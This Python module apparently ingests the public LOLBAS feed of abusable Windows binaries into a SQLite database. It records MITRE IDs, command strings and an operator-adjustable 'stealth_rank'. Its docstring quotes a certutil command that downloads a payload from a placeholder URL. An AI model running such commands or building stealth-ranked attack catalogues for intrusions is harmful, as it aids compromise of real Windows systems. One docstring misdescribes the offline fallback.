"""
forge/phase0/lolbas_fetcher.py — LOLBAS JSON feed ingestor.

Source: https://lolbas-project.github.io/api/lolbas.json
Format: JSON array of LOLBin objects.
Target: knowledge.db → table: lolbas (existing ETL schema)

LOLBAS JSON structure per entry:
  {
    "Name": "Certutil.exe",
    "Description": "Certificate management utility",
    "Author": "...",
    "Created": "...",
    "Commands": [
      {
        "Command": "certutil -urlcache -split -f http://... payload.exe",
        "Description": "Download a file from a URL",
        "Usecase": "Download",
        "Category": "Download",
        "Privileges": "User",
        "MitreID": "T1105",
        ...
      }
    ],
    "Full_Path": [...],
    "Code_Sample": [...],
    "Detection": [...]
  }

Normalisation rules (PRD §5.3):
  - One lolbas row per Name (UNIQUE constraint → INSERT OR IGNORE dedup).
  - Category derived from first Commands[].Category, lowercased.
  - Use_case concatenated from all Commands[].Usecase, deduplicated.
  - MITRE IDs from Commands[].MitreID, deduplicated, comma-separated.
  - Stealth rank defaulted to 5; operator can adjust post-ingest.
  - commands stored as JSON array of command strings.
"""

from __future__ import annotations

import json
import logging
import sqlite3
from typing import Any

from forge.config import ForgeConfig

_LOG = logging.getLogger(__name__)

LOLBAS_URL: str = "https://lolbas-project.github.io/api/lolbas.json"


def fetch_lolbas(conn: sqlite3.Connection, cfg: ForgeConfig) -> int:
    """
    Fetch LOLBAS JSON feed and ingest into lolbas.db.

    :param conn: Open write connection to lolbas.db.
    :param cfg: ForgeConfig for HTTP client settings.
    :returns: Number of records inserted (INSERT OR IGNORE; skips existing).
    """
    raw = _http_get(LOLBAS_URL, cfg)
    entries: list[dict] = json.loads(raw)
    _LOG.info("LOLBAS: fetched %d raw entries.", len(entries))

    normalised = [_normalise(e) for e in entries if _normalise(e) is not None]
    inserted = _bulk_insert(conn, normalised)
    _LOG.info("LOLBAS: %d/%d records inserted (dedup skipped existing).", inserted, len(normalised))
    return inserted


def _normalise(entry: dict[str, Any]) -> dict[str, Any] | None:
    """Normalise a raw LOLBAS JSON entry into a flat DB row."""
    name = (entry.get("Name") or "").strip()
    if not name:
        return None

    commands_raw: list[dict] = entry.get("Commands") or []

    # Derive category from first command entry.
    category = "misc"
    if commands_raw:
        category = (commands_raw[0].get("Category") or "misc").lower().strip()

    # Deduplicated use-cases and MITRE IDs.
    use_cases: list[str] = []
    mitre_ids: list[str] = []
    commands: list[str] = []
    for cmd in commands_raw:
        uc = (cmd.get("Usecase") or cmd.get("Description") or "").strip()
        if uc and uc not in use_cases:
            use_cases.append(uc)
        mid = (cmd.get("MitreID") or "").strip()
        if mid and mid not in mitre_ids:
            mitre_ids.append(mid)
        c = (cmd.get("Command") or "").strip()
        if c and c not in commands:
            commands.append(c)

    description = (entry.get("Description") or "").strip()

    # OS family: LOLBAS is Windows-only; GTFOBins covers linux/macos.
    os_family = "windows"

    return {
        "name": name,
        "os_family": os_family,
        "category": category,
        "description": description,
        "use_case": "; ".join(use_cases),
        "mitre_technique": ", ".join(mitre_ids),
        "commands": json.dumps(commands),
        "stealth_rank": 5,
        "source": "lolbas",
    }


def _bulk_insert(conn: sqlite3.Connection, rows: list[dict]) -> int:
    """INSERT OR IGNORE all normalised rows. Returns count actually inserted."""
    before = conn.execute("SELECT COUNT(*) FROM lolbas").fetchone()[0]
    conn.executemany(
        """
        INSERT OR IGNORE INTO lolbas
            (name, os_family, category, description, use_case,
             mitre_technique, commands, stealth_rank, source)
        VALUES
            (:name, :os_family, :category, :description, :use_case,
             :mitre_technique, :commands, :stealth_rank, :source)
        """,
        rows,
    )
    conn.commit()
    after = conn.execute("SELECT COUNT(*) FROM lolbas").fetchone()[0]
    return after - before


def _http_get(url: str, cfg: ForgeConfig) -> bytes:
    """
    Fetch *url* using curl_cffi for TLS impersonation.

    Falls back to a cached local copy if FORGE_OFFLINE_STRICT=1.
    """
    if cfg.offline_strict:
        raise RuntimeError(
            "FORGE_OFFLINE_STRICT is set. Cannot fetch LOLBAS feed. "
            "Pre-populate lolbas.db manually."
        )
    try:
        from curl_cffi import requests as cffi_requests  # noqa: PLC0415

        proxies = {"https": cfg.proxy} if cfg.proxy else None
        resp = cffi_requests.get(
            url,
            impersonate=cfg.curl_profile,
            proxies=proxies,
            timeout=30,
        )
        resp.raise_for_status()
        return resp.content
    except ImportError:
        _LOG.warning("curl_cffi not installed; falling back to urllib.")
        import urllib.request  # noqa: PLC0415

        with urllib.request.urlopen(url, timeout=30) as r:  # noqa: S310
            return r.read()
